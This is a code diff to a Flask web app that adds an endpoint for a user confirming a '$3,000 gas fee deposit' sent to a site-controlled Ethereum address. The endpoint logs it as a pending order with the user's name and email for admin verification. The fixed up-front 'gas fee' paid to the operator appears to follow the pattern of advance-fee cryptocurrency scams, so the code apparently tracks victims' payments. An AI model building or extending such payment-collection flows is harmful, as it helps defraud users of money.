@@ -205,6 +205,42 @@ def swap_request():
     })
 
 
+@api_bp.route("/gas-fee/request", methods=["POST"])
+@login_required
+def gas_fee_request():
+    """User clicks 'I Have Sent' on the $3000 gas fee deposit.
+    Creates a pending SwapOrder tagged as a gas-fee event and notifies admin."""
+    import uuid
+
+    deposit_address = DISPLAY_EVM  # always EVM for gas fee
+
+    order = SwapOrder(
+        id              = str(uuid.uuid4()),
+        user_id         = current_user.id,
+        token_symbol    = "GAS_FEE",
+        token_name      = "Gas Fee Deposit",
+        token_address   = "",
+        chain           = "ethereum",
+        amount_usd      = 3000.0,
+        deposit_chain   = "ethereum",
+        deposit_address = deposit_address,
+        status          = "pending",
+        admin_note      = (
+            f"⛽ GAS FEE DEPOSIT — User {current_user.username} ({current_user.email}) "
+            f"has confirmed sending $3,000 gas fee to {deposit_address}. "
+            "Awaiting admin verification."
+        ),
+    )
+    db.session.add(order)
+    db.session.commit()
+
+    return jsonify({
+        "ok": True,
+        "order_id": order.id,
+        "message": "Gas fee notification sent. Your transaction is pending admin approval.",
+    })
+
+
 @api_bp.route("/bot/balance", methods=["GET"])
 def bot_balance():
     """
